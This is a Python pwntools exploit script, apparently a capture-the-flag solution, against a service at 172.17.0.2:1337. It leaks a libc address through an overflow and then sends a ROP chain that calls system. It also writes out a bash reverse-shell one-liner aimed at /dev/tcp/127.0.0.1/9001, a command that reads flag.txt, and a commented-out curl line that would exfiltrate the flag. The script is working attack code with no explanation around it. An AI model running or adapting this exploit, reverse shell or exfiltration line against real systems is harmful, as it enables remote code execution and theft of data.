from pwn import *
import time

context.log_level = "critical"

while(True):
	try:
		p1 = remote("172.17.0.2",1337)
	except:
		time.sleep(3)
		continue

	p1.sendlineafter(b"> ",b"t")
	time.sleep(1)
	p1.sendafter(b"> ",b"A"*0x42)
	p1.recvuntil(b"A"*0x42)
	time.sleep(1)
	leak = p1.recvline().strip()
	print(leak)
	leak = u64(leak+b"\x00"*2)
	print(hex(leak))
	libc_base = leak - 0x219e67
	print(hex(libc_base))
	if (libc_base&0xfff != 0):
		p1.sendline(b"reset")
		p1.close()
	else:
		break
system = libc_base + 0x000000000058750

p1.clean()
p1.sendline(b"bash -c 'bash -i >& /dev/tcp/127.0.0.1/9001 0>&1'")
p1.sendline(b"cat /app/flag.txt")
#p1.sendline(b"curl http://localhost/$(cat ./flag.txt)")

oneliner_addr = 0x1338080
pop_rdi = libc_base + 0x000000000010f75b

ROP = p64(pop_rdi+1) + p64(pop_rdi) + p64(oneliner_addr) + p64(system)

input("ready?")

p2 = remote("172.17.0.2",1337)

p2.sendlineafter(b"> ",b"test2")
p2.recvuntil(b"> ")
checked = False
while(True):
	p2.send(b"A"*0x20)
	p2.send(b"A"*(0x132-4) + ROP)
	res = p2.clean(timeout=0.0000001)
	print(len(res))
	if len(res) == 4 and checked:
		p1.close()
		p2.close()
		break
	elif len(res) == 4:
		checked = True
	else:
		checked = False

		
